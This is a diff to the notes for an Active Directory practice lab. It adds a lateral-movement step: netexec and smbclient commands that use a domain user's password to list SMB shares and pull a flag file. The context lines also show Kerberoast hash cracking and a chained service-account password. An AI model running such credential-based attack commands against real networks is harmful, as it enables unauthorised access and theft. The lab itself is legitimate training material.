@@ -35,3 +35,16 @@ nxc ldap $IP -u alice -p Spring2024! --bloodhound -c all --dns-server $IP
 ldapsearch -x -H ldap://$IP -b "dc=lab,dc=local" "(objectClass=user)"
 ```
 Then crack the tickets: `crack hashes.txt` (hashcat -m 13100 kerberoast / -m 18200 AS-REP).
+
+## MEMBER01 (domain-joined member server — lateral movement)
+The lab now includes a member server joined to LAB.LOCAL with an SMB share.
+- **member01** = `172.30.0.20`  (host port `1445` -> SMB), DC = `172.30.0.10`
+- Share `//member01/data` is readable by any Domain User.
+
+```bash
+MEM=172.30.0.20
+nxc smb $MEM -u alice -p 'Spring2024!' --shares          # domain creds work on the member
+smbclient //$MEM/data -U 'LAB\alice%Spring2024!' -c 'ls; get secret.txt'
+```
+Scenario: get a domain user's creds (kerberoast/spray on the DC) -> read the member share
+-> loot `secret.txt` (flag) and `notes.txt` (chained creds svc_backup:Backup2023!).
